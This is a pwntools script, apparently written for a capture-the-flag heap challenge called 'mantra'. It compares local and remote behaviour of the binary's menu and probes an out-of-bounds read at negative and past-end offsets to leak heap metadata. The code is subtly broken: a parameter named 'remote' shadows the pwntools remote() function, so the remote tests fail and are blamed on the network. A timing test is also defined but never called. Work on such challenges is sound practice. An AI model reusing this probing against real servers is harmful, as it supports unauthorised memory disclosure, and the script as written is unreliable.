#!/usr/bin/env python3
"""
Remote server comprehensive testing
Compares remote vs local behavior for any differences
"""
from pwn import *
import time

context.log_level = 'debug'

LOCAL_PATH = ['./glibc/ld-2.34.so', './mantra']
REMOTE_HOST = '154.57.164.73'
REMOTE_PORT = 30861

def test_basic_behavior(remote=False):
    """Test basic bead operations"""
    log.info(f"Testing {'REMOTE' if remote else 'LOCAL'} basic behavior")

    if remote:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(LOCAL_PATH)

    # Weave cord with 100 beads
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'string: ', b'100')
    log.success("Cord woven")

    # Tie 3 beads
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'tie? ', b'3')
    for i in range(3):
        io.sendlineafter(b'glyphs): ', f'BEAD{i}XX'.encode())
        log.success(f"Bead {i} tied")

    # Recite bead 0
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'recite? ', b'0')
    io.recvuntil(b'speaks: [')
    data = io.recvuntil(b']', drop=True)
    log.success(f"Bead 0 contains: {data}")

    # Retie bead 1
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'retie? ', b'1')
    io.sendlineafter(b'glyphs): ', b'RETIEDXX')
    log.success("Bead 1 retied")

    # Try to retie again (should fail)
    io.sendlineafter(b'> ', b'3')
    response = io.recvline(timeout=2)
    if b'cord resists' in response:
        log.success("Second retie correctly blocked")
    else:
        log.warning(f"Unexpected behavior: {response}")

    io.close()
    return data

def test_heap_metadata(remote=False):
    """Test reading heap metadata"""
    log.info(f"Testing {'REMOTE' if remote else 'LOCAL'} heap metadata")

    if remote:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(LOCAL_PATH)

    # Weave and tie
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'string: ', b'100')
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'tie? ', b'1')
    io.sendlineafter(b'glyphs): ', b'TESTTEST')

    # Read our own chunk size at offset -1
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'recite? ', b'-1')
    io.recvuntil(b'speaks: [')
    data_neg1 = io.recvuntil(b']', drop=True)

    # Read top chunk area at offset 101
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'recite? ', b'101')
    io.recvuntil(b'speaks: [')
    data_101 = io.recvuntil(b']', drop=True)

    log.success(f"Offset -1: {data_neg1.hex() if data_neg1 else 'empty'}")
    log.success(f"Offset 101: {data_101.hex() if data_101 else 'empty'}")

    io.close()
    return data_neg1, data_101

def test_timing_behavior(remote=False):
    """Test for timing side channels"""
    log.info(f"Testing {'REMOTE' if remote else 'LOCAL'} timing behavior")

    if remote:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(LOCAL_PATH)

    times = []

    # Weave
    start = time.time()
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'string: ', b'100')
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'tie? ', b'1')
    io.sendlineafter(b'glyphs): ', b'TESTTEST')
    times.append(time.time() - start)

    # Test different offsets and measure
    for offset in [0, -1, 101, 1000, 10000]:
        io.sendlineafter(b'> ', b'4')
        start = time.time()
        io.sendlineafter(b'recite? ', str(offset).encode())
        io.recvuntil(b'speaks: [')
        io.recvuntil(b']')
        elapsed = time.time() - start
        times.append(elapsed)
        log.info(f"Offset {offset}: {elapsed:.4f}s")

    io.close()
    return times

def test_allocation_sizes(remote=False):
    """Test different allocation sizes"""
    log.info(f"Testing {'REMOTE' if remote else 'LOCAL'} allocation sizes")

    sizes = [10, 50, 100, 200, 500, 1000]
    results = {}

    for size in sizes:
        log.info(f"Testing size: {size}")

        if remote:
            io = remote(REMOTE_HOST, REMOTE_PORT)
        else:
            io = process(LOCAL_PATH)

        # Weave
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', str(size).encode())

        # Tie one bead
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'1')
        io.sendlineafter(b'glyphs): ', b'TESTTEST')

        # Read chunk metadata at -1
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'-1')
        io.recvuntil(b'speaks: [')
        chunk_size = io.recvuntil(b']', drop=True)

        # Read at offset = size (should be top chunk or next)
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', str(size).encode())
        io.recvuntil(b'speaks: [')
        next_data = io.recvuntil(b']', drop=True)

        results[size] = (chunk_size, next_data)

        log.success(f"Size {size}: chunk={chunk_size.hex() if chunk_size else None}, next={next_data.hex() if next_data else None}")

        io.close()

    return results

def main():
    log.info("=" * 60)
    log.info("REMOTE SERVER COMPREHENSIVE TESTING")
    log.info("=" * 60)

    try:
        # Test 1: Basic behavior
        local_data = test_basic_behavior(remote=False)
        remote_data = test_basic_behavior(remote=True)

        if local_data == remote_data:
            log.success("✓ Basic behavior matches")
        else:
            log.warning("✗ Behavior difference detected!")
            log.warning(f"Local: {local_data}")
            log.warning(f"Remote: {remote_data}")

        # Test 2: Heap metadata
        log.info("\n" + "="*60)
        local_meta = test_heap_metadata(remote=False)
        remote_meta = test_heap_metadata(remote=True)

        if local_meta == remote_meta:
            log.success("✓ Heap metadata matches")
        else:
            log.warning("✗ Metadata difference!")
            log.warning(f"Local: {local_meta}")
            log.warning(f"Remote: {remote_meta}")

        # Test 3: Allocation sizes
        log.info("\n" + "="*60)
        local_sizes = test_allocation_sizes(remote=False)
        remote_sizes = test_allocation_sizes(remote=True)

        if local_sizes == remote_sizes:
            log.success("✓ Allocation patterns match")
        else:
            log.warning("✗ Allocation difference!")
            for size in local_sizes:
                if local_sizes[size] != remote_sizes[size]:
                    log.warning(f"Size {size} differs:")
                    log.warning(f"  Local: {local_sizes[size]}")
                    log.warning(f"  Remote: {remote_sizes[size]}")

    except Exception as e:
        log.error(f"Remote testing error: {e}")
        log.error("Server may be down or network issue")

if __name__ == '__main__':
    main()
